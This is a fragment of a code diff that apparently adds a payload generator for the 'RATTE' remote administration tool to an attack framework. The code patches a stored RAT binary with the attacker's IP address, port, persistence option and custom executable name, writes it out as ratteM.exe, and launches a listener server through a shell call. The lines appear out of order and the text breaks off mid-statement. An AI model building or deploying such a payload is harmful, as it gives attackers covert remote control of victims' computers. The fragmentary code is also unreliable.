@@ -1,0 +1,18 @@
+
+MAIN=" RATTE (Remote Administration Tool Tommy Edition) Create Payload only. Read the readme/RATTE-Readme.txt first"
+AUTHOR=" Thomas Werth"
+	subprocess.Popen("src/payloads/ratte/ratteserver %d" % (port), shell=True).wait()
+def prepare_ratte(ipaddr,ratteport, persistent,customexe):
+	print_info("preparing RATTE...")
+	fileopen=open("src/payloads/ratte/ratte.binary" , "rb")
+	data=fileopen.read()
+	fileopen.close()
+	filewrite=open(setdir + "/ratteM.exe", "wb")
+	host=int(len(ipaddr)+1) * "X"
+	rPort=int(len(str(ratteport))+1) * "Y"
+	pers=int(len(str(persistent))+1) * "Z"
+	if len(str(customexe)) > 0:
+		cexe=int(len(str(customexe))+1) * "Q"
+	else:
+		cexe=""
+	filewrite.write(data.replace(str(cexe), customexe+"\x00", 1).replace(str(pers), persistent+"
